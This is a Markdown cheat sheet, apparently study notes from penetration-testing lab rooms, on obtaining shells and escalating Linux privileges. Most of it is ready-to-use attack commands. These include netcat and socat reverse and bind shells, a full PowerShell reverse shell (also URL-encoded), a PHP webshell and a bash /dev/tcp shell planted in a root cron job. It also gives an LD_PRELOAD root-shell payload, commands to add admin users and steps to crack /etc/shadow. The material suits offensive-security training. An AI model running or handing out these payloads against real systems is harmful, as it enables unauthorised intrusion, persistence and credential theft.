# Privilege Escalation

## Shell  
- [Reverse Shell Cheat Sheet](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)  
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- `/usr/share/webshells`: Pre-installed webshells on kali  

### Types of Shell
- Reverse shells are when the target is forced to execute code that connects back to your computer.
- Bind shells are when the code executed on the target is used to start a listener attached to a shell directly on the target.  

### Netcat  
*Reverse Shells*  
`nc -lvnp <port-number>`: starting a netcat listener  
`-l` is used to tell netcat that this will be a listener  
`-v` is used to request a verbose output  
`-n` tells netcat not to resolve host names or use DNS. Explaining this is outwith the scope of the room.  
`-p` indicates that the port specification will follow.  
Be aware that if you choose to use a port below 1024, you will need to use `sudo` when starting your listener.   
<br>

*Blind Shells*  
`nc <target-ip> <chosen-port>`: make an outbound connection to connect a
netcat listener  

#### Netcat Shell Stabilization
*Technique 1: Python*  
<details>
<summary>details</summary>

1. `python -c 'import pty;pty.spawn("/bin/bash")'`  
    note that some targets may need the version of Python specified.   
2. `export TERM=xterm` -- this will give us access to term commands such as `clear`  
3.  Background the shell using `Ctrl + Z`. Back in our own terminal we use `stty raw -echo; fg`. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.   
    <img src="https://user-images.githubusercontent.com/73976100/222940244-bb418620-8fc6-4f51-ab5a-27e8dfbdbab4.png" width="600">  
Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type `reset` and press enter.  
</details>

*Technique 2: rlwrap*  
<details>
<summary>details</summary>

rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell.  
`sudo apt install rlwrap`  
`rlwrap nc -lvnp <port>`  
When dealing with a Linux target, it's possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with `Ctrl + Z`, then use `stty raw -echo; fg` to stabilise and re-enter the shell.  
</details>

*Technique 3: Socat*  
<details>
<summary>details</summary>

The third easy way to stabilise a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell. Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell. To accomplish this method of stabilisation we would first transfer a [socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (`sudo python3 -m http.server 80`), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (`wget <LOCAL-IP>/socat -O /tmp/socat`).  
For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed (`Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`). We will cover the syntax for sending and receiving shells with Socat in the upcoming tasks.  

<img src="https://user-images.githubusercontent.com/73976100/222940820-00bf8238-f60a-4d4f-afe9-d794fd46fc42.png" width="700">  

`stty -a`: Change the terminal tty size  
`stty rows <number>`  
`stty cols <number>`
</details>

### Socat
*Reverse Shells*  
`socat TCP-L:<port> -`:  this is taking two points (a listening port, and standard input) and connecting them together.  
`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`: On Windows command to connect back  
`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`: On Linux  

*Bind Shells*  
`socat TCP-L:<PORT> EXEC:"bash -li"`: On a Linux target  
`socat TCP-L:<PORT> EXEC:powershell.exe,pipes`: On a Windows target  
`socat TCP:<TARGET-IP>:<TARGET-PORT> -`:  On an attacking machine  

*a fully stable Linux tty reverse shell*
```
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```
```
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
<img src="https://user-images.githubusercontent.com/73976100/222942912-2b022e20-e9f5-4b14-b888-465bcee32fad.png">  
left: listener running on our local attacking machine  
right: compromised target  
<details>

- pty, allocates a pseudoterminal on the target -- part of the stabilisation process
- stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
- sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
- setsid, creates the process in a new session
- sane, stabilises the terminal, attempting to "normalise" it.
</details>

### Socat Encrypted Shells  
`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`: generate a certificate (on an attacking machine is easy)  
`cat shell.key shell.crt > shell.pem`: merge the two created files into a single `.pem` file  
`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`: set up a reverse shell listener  
`verify=0`: not bother trying to validate  
`socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`: connect back  
Bind shell  
Target:
`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`  
Attacker:
`socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`  
<details>
<img src="https://user-images.githubusercontent.com/73976100/222943648-ca52adef-2048-4429-b36b-6c8b3942cba3.png">  
</details>

### Common Shell Payloads  
`nc.exe`: `/usr/share/windows-resources/binaries` in Kali     
`nc -lvnp <PORT> -e /bin/bash`  
`nc <LOCAL-IP> <PORT> -e /bin/bash `  
bind shell: `mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`  
reverse shell: `mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`  
Powershell reverse shell:  
```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```  
<img src="https://user-images.githubusercontent.com/73976100/222944957-405871af-45c6-45aa-b8d7-e53fa21ee8d5.png">  

### WebShells
"Webshell" is a colloquial term for a script that runs inside a webserver (usually in a language such as PHP or ASP) which executes code on the server.   

`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`  
This will take a GET parameter in the URL and execute it on the system with shell_exec().  
<img src="https://user-images.githubusercontent.com/73976100/222945750-dac50e93-affe-4e85-96b6-c223ae5689d4.png" width="600">  

[PentestMonkey php-reverse-shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)  
`/usr/share/webshells/php/php-reverse-shell.php`: in kali  

When the target is Windows, it is often easiest to obtain RCE using a web shell, or by using msfvenom to generate a reverse/bind shell in the language of the server. With the former method, obtaining RCE is often done with a URL Encoded Powershell Reverse Shell. This would be copied into the URL as the `cmd` argument:  
```
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```

### Next Steps  
On Linux ideally we would be looking for opportunities to gain access to a user account. SSH keys stored at `/home/<user>/.ssh` are often an ideal way to do this. In particular something like [Dirty C0w](https://dirtycow.ninja/) or a writeable /etc/shadow or /etc/passwd would quickly give you SSH access to the machine, assuming SSH is open.  
<br>

On Windows the options are often more limited. It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at `C:\Program Files\FileZilla Server\FileZilla Server.xml` or `C:\xampp\FileZilla Server\FileZilla Server.xml`. These can be MD5 hashes or in plaintext, depending on the version.  
Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges.  
`net user <username> <password> /add`  
`net localgroup administrators <username> /add`  

## Linux Privilege Escalation
### Enumeration
- `hostname`: return the hostname of the target machine  
- `uname -a`: print system more information about the kernel
- `/proc/version`: provides information about the target system processes
- `/etc/issue`: contains some information about the operating system  
- `ps`: see the running processes  
    - PID: The process ID (unique to the process)
    - TTY: Terminal type used by the user
    - Time: Amount of CPU time used by the process (this is NOT the time this process has been running for)
    - CMD: The command or executable running (will NOT display any command line parameter)  
    - `ps -A`: view all running processes
    - `ps axjf`: view process tree 
    - `ps aux`: show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x)  
- `env`: show environmental variables  
    <details>
    <summary>image</summary>

    <img src="https://user-images.githubusercontent.com/73976100/223572360-ab79bd05-32e8-44dd-9d58-049bf06be043.png" width="800">  
    </details>

- `sudo -l`: list all commands user can run using `sudo`  
- `ls`: `ls -als`  
- `id`: provide a general overview of the user’s privilege level and group memberships  
- `/etc/passwd`: an easy way to discover users on the system  
    <img src="https://user-images.githubusercontent.com/73976100/223573778-7e2a8118-3445-468f-b1b6-f661f6c7c548.png" width="400">  
    Remember that this will return all users, some of which are system or service users that would not be very useful. Another approach could be to grep for “home” as real users will most likely have their folders under the “home” directory.  
    `cat /etc/passwd | grep home`  
- `history`: Looking at earlier commands  
- `ifconfig`: information about the network interfaces of the system  
- `ip route`: see which network routes exist  
- `netstat`: check for existing interfaces and network routes  
    - `netstat -a`: shows all listening ports and established connections.
    - `netstat -at` or `netstat -au` can also be used to list TCP or UDP protocols respectively.
    - `netstat -l`: list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that are listening using the TCP protocol (below)
    - `netstat -s`: list network usage statistics by protocol (below) This can also be used with the `-t` or `-u` options to limit the output to a specific protocol.
    - `netstat -ltp`: list connections with the service name and PID information.
    - `netstat -i`: Shows interface statistics. We see below that “eth0” and “tun0” are more active than “tun1”.
    - `netstat -ano`: `-a`:Display all sockets, `-n`: Do not resolve names, `-o`: Display timers  
- `find` Command
    - `find . -name flag1.txt`: find the file named “flag1.txt” in the current directory
    - `find /home -name flag1.txt`: find the file names “flag1.txt” in the /home directory
    - `find / -type d -name config`: find the directory named config under “/”
    - `find / -type f -perm 0777`: find files with the 777 permissions (files readable, writable, and executable by all users)
    - `find / -perm a=x`: find executable files
    - `find /home -user frank`: find all files for user “frank” under “/home”
    - `find / -mtime 10`: find files that were modified in the last 10 days
    - `find / -atime 10`: find files that were accessed in the last 10 day
    - `find / -cmin -60`: find files changed within the last hour (60 minutes)
    - `find / -amin -60`: find files accesses within the last hour (60 minutes)
    - `find / -size 50M`: find files with a 50 MB size  
    It is important to note that the “find” command tends to generate errors which sometimes makes the output hard to read. This is why it would be wise to use the “find” command with “-type f 2>/dev/null” to redirect errors to “/dev/null” and have a cleaner output.  
    Folders and files that can be written to or executed from:
    - `find / -writable -type d 2>/dev/null`: Find world-writeable folders
    - `find / -perm -222 -type d 2>/dev/null`: Find world-writeable folders
    - `find / -perm -o w -type d 2>/dev/null`: Find world-writeable folders
    - `find / -perm -o x -type d 2>/dev/null`: Find world-executable folders
    Find development tools and supported languages:
    - `find / -name perl*`
    - `find / -name python*`
    - `find / -name gcc*`  
    The SUID bit allows the file to run with the privilege level of the account that owns it, rather than the account which runs it.
    - `find / -perm -u=s -type f 2>/dev/null`: Find files with the SUID bit.

### Automated Enumeration Tools
- LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
- LinEnum: https://github.com/rebootuser/LinEnum
- LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
- Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
- Linux Priv Checker: https://github.com/linted/linuxprivchecker

### Privilege Escalation: Kernel Exploits
The kernel on Linux systems manages the communication between components such as the memory on the system and applications. This critical function requires the kernel to have specific privileges; thus, a successful exploit will potentially lead to root privileges.  
1. Identify the kernel version
2. Search and find an exploit code for the kernel version of the target system
3. Run the exploit  
NOTE: A failed kernel exploit can lead to system crash.  

Reseach sources:
1. Google search
2. https://www.linuxkernelcves.com/cves
3. A script like LES (Linux Exploit Suggester), but make many FP and FN  

<details>
<summary> task_5 </summary>

1. Identify the kernel version.
2. Search and find an exploit code for the kernel version of the target system.
3. Compile exploit code. `gcc 37292.c -o exploit -masm=intel -w`
4. Move `/tmp` in Target Machine. `/tmp` is permission that user can write.
5. wget and exploit

</details>

### Privilege Escalation: Sudo
`sudo -l`: Any user can check its current situation related to root privileges  
https://gtfobins.github.io/ information on how any program, on which you may have sudo rights, can be used  

**Leverage application functions**  
Some applications will not have a known exploit within this context. Such an application you may see is the Apache2 server.  
In this case, we can use a "hack" to leak information leveraging a function of the application. As you can see below, Apache2 has an option that supports loading alternative configuration files (`-f` : specify an alternate ServerConfigFile).  
Loading the `/etc/shadow` file using this option will result in an error message that includes the first line of the `/etc/shadow` file.

**Leverage LD_PRELOAD**  
On some systems, you may see the LD_PRELOAD environment option.  
<img src="https://user-images.githubusercontent.com/73976100/224011113-f5c57311-318b-40c8-b88f-6926a4aa8366.png" width="500">  
[LD_PRELOAD](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) is a function that allows any program to use shared libraries. If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run.  
Note: the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.  
Summary:  
1. Check for LD_PRELOAD (with the env_keep option)  
2. Write a simple C code compiled as a share object (.so extension) file  
3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;  
`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`  
This will result in a shell spawn with root privileges.  
<img src="https://user-images.githubusercontent.com/73976100/224015606-15b05e75-fb9a-4624-86dd-4cc9b5334cd6.png" width=1000>  

### Privilege Escalation: SUID
[Linux: SUID、SGID、スティッキービットまとめ](https://qiita.com/aosho235/items/16434a490f9a05ddb0dc)  
Users within their privilege levels changes with SUID(Set-user Identification) and SGID(Set-group Identification). These allow files to be executed with the permission level of the file owner or the group owner, respectively.  
`find / -type f -perm -04000 -ls 2>/dev/null`: list files that have SUID or SGID bits set  
<details>
<summary>image</summary>

![fJEeZ4m](https://user-images.githubusercontent.com/73976100/224185408-d3b5ee86-5e23-4445-a757-237308904644.png)  
</details>  

Clicking on the SUID button in [GTFOBins](https://gtfobins.github.io/#+suid)  

The list above shows that nano has the SUID bit set. Unfortunately, GTFObins does not provide us with an easy win.  

The SUID bit set for the nano text editor allows us to create, edit and read files using the file owner’s privilege. Nano is owned by root, which probably means that we can read and edit files at a higher privilege level than our current user has. At this stage, we have two basic options for privilege escalation: reading the `/etc/shadow` file or adding our user to `/etc/passwd`.  

<details>
<summary> demo </summary>

1. reading the `/etc/shadow` file.
2. We see that the nano text editor has the SUID bit set by running the `find / -type f -perm -04000 -ls 2>/dev/null` command.
3. `nano /etc/shadow` will print the contents of the `/etc/shadow` file. We can now use the unshadow tool to create a file crackable by John the Ripper. To achieve this, unshadow needs both the `/etc/shadow` and `/etc/passwd` files.  
![DAWxbJD](https://user-images.githubusercontent.com/73976100/224442223-3ff1eebb-ea4b-4bc4-a789-78b14dc74d1b.png)
4. The unshadow tool’s usage can be seen below;
`unshadow passwd.txt shadow.txt > passwords.txt`  
![6cHBAr1](https://user-images.githubusercontent.com/73976100/224442815-77034199-2b2b-43f8-9ac3-a6fed91e8ba2.png)  
5. Delete the other users credential in password.txt before crack.
6. `john [--wordlist=/usr/share/wordlists/rockyou.txt] passwords.txt`

The Other Option: Add a new user  
1. We will need the hash value of the password we want the new user to have. This can be done quickly using the openssl tool on Kali Linux.  
![bkOGaHY](https://user-images.githubusercontent.com/73976100/224442955-7ab56fa3-d3dc-4ce9-b1a4-7cd8a4ec262b.png)  
2. We will then add this password with a username to the `/etc/passwd` file.
3. Once our user is added (please note how `root:/bin/bash` was used to provide a root shell) we will need to switch to this user and hopefully should have root privileges.

</details>

### Privilege Escalation: Capabilities
Capabilities help manage privileges at a more granular level.  
<details>
<summaty>details</summary>
Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.
The capabilities man page provides detailed information on its usage and options.
</details>  

We can use the `getcap` tool to list enabled capabilities.  
`getcap -r / 2>/dev/null`:  
<img src="https://user-images.githubusercontent.com/73976100/224457735-9470b2ac-a3f6-46ad-8a0e-a535a636d2d1.png" width="800">  
[GTFObins](https://gtfobins.github.io/#+Capabilities) has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.  
We notice that vim can be used with the following command and payload:

`./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`

### Privilege Escalation: Cron Jobs
Cron jobs are used to run scripts or binaries at specific times. If there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.  
Our goal will be to find a cron job set by root and have it run our script, ideally a shell.
<details>
<summary>demo</summary>

Any user can read the file keeping system-wide cron jobs under `/etc/crontab`  
<img src="https://user-images.githubusercontent.com/73976100/224460132-2c5ff984-aafc-498a-88a0-b5040d41fcfb.png" width="600">  
You can see the `backup.sh` script was configured to run every minute. The content of the file shows a simple script that creates a backup of the prices.xls file.  
<img src="https://user-images.githubusercontent.com/73976100/224461003-381c593c-f9d3-4aff-a2e7-f8383c46ca58.png" width="400">  
As our current user can access this script, we can easily modify it to create a reverse shell, hopefully with root privileges.  

`/bin/bash -i >& /dev/tcp/10.10.10.1/4444 0>&1`  
<img src="https://user-images.githubusercontent.com/73976100/224461076-ff88bab7-1caa-4f62-b89e-ebe201a6c7a1.png" width="400">  
We will now run a listener on our attacking machine to receive the incoming connection.  
<img src="https://user-images.githubusercontent.com/73976100/224470386-a5b95cb7-c3b7-41be-ab22-7fe33c5b8d65.png" width="600">  

</details>
Crontab is always worth checking as it can sometimes lead to easy privilege escalation vectors. The following scenario is not uncommon in companies that do not have a certain cyber security maturity level:
1. System administrators need to run a script at regular intervals.
2. They create a cron job to do this
3. After a while, the script becomes useless, and they delete it
4. They do not clean the relevant cron job


### Privilege Escalation: PATH
If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script.   
Typically the PATH will look like this:  
<img src="https://user-images.githubusercontent.com/73976100/224472396-b4a6c1c0-f248-4a4c-a9d6-3dbbc3e49826.png" width="700">  
Configuration of the target system:

1. What folders are located under $PATH
2. Does your current user have write privileges for any of these folders?
3. Can you modify $PATH?
4. Is there a script/application you can start that will be affected by this vulnerability?  

<details>
<summary> demo </summary>

For demo purposes, we will use the script below:  
<img src="https://user-images.githubusercontent.com/73976100/224473899-968b7fff-3cad-4705-ad70-8b11be1a2aba.png" width="300">  
This script tries to launch a system binary called “thm” but the example can easily be replicated with any binary.  
We compile this into an executable and set the SUID bit.  
<img src="https://user-images.githubusercontent.com/73976100/224473983-39fb523b-711d-4968-84c2-2191f68bc395.png" width="500">  
Our user now has access to the “path” script with SUID bit set.  
Once executed “path” will look for an executable named “thm” inside folders listed under PATH.  
If any writable folder is listed under PATH we could create a binary named thm under that directory and have our “path” script run it. As the SUID bit is set, this binary will run with root privilege.  

If any writable folder is listed under PATH we could create a binary named thm under that directory and have our “path” script run it. As the SUID bit is set, this binary will run with root privilege.  
A simple search for writable folders can done using the “`find / -writable 2>/dev/null`” command.  
<img src="https://user-images.githubusercontent.com/73976100/224473112-ebbfb665-b3f2-4738-be2d-a66a8b141412.png" width="700">  
Comparing this with PATH will help us find folders we could use.  
We see a number of folders under /usr, thus it could be easier to run our writable folder search once more to cover subfolders.  
<img src="https://user-images.githubusercontent.com/73976100/224474900-e3a925f0-3a8a-4437-a19f-9b4d92936e7b.png" width="700">  
An alternative could be the command below.  

`find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`  
Unfortunately, subfolders under /usr are not writable.  
The folder that will be easier to write to is probably `/tmp`. At this point because /tmp is not present in PATH so we will need to add it. As we can see below, the “`export PATH=/tmp:$PATH`” command accomplishes this.  
<img src="https://user-images.githubusercontent.com/73976100/224473640-daee466d-b2da-4fd6-9994-0280016b345d.png" width="700">  
At this point the path script will also look under the /tmp folder for an executable named “thm”.  
Creating this command is fairly easy by copying /bin/bash as “thm” under the /tmp folder.  
<img src="https://user-images.githubusercontent.com/73976100/224474257-c519e961-8083-42b9-9401-4e1b2615afbb.png" width="400">  
We have given executable rights to our copy of /bin/bash, please note that at this point it will run with our user’s right. What makes a privilege escalation possible within this context is that the path script runs with root privileges.  
<img src="https://user-images.githubusercontent.com/73976100/224474349-a57864f9-5810-42c9-b16b-9afe6e0f7b16.png" width="800">  

</details>

### Privilege Escalation: NFS  
Shared folders and remote management interfaces such as SSH and Telnet can also help you gain root access on the target system.  
NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.  
<img src="https://user-images.githubusercontent.com/73976100/224476435-247dfff3-7a3a-4ec6-9709-0fc6b4417e2a.png" width="600">  
The critical element for this privilege escalation vector is the “no_root_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.  
<details>
<summary>demo</summary>

1. enumerating mountable shares from our attacking machine  
    <img src="https://user-images.githubusercontent.com/73976100/224476986-c713496f-a098-4b65-ba9e-db51961ecd4f.png" width="300">  
2. We will mount one of the “no_root_squash” shares to our attacking machine and start building our executable.  
    <img src="https://user-images.githubusercontent.com/73976100/224477136-0724c443-4a55-40d5-9862-58f48e36cdb4.png" width="600">  
3. As we can set SUID bits, a simple executable that will run /bin/bash on the target system will do the job.  
    <img src="https://user-images.githubusercontent.com/73976100/224477324-5d16135b-4b53-4cff-9e65-6dbad63e697c.png" width="300">  
4. Once we compile the code we will set the SUID bit.  
    <img src="https://user-images.githubusercontent.com/73976100/224477391-a0a7a98a-ad90-46b8-a3ee-42112c4e3e86.png" width="500">  
5. You will see below that both files (nfs.c and nfs are present on the target system. We have worked on the mounted share so there was no need to transfer them).  
    <img src="https://user-images.githubusercontent.com/73976100/224477440-7db69826-835c-45c9-8cc3-8f960f690bc4.png" width="800">  
</details>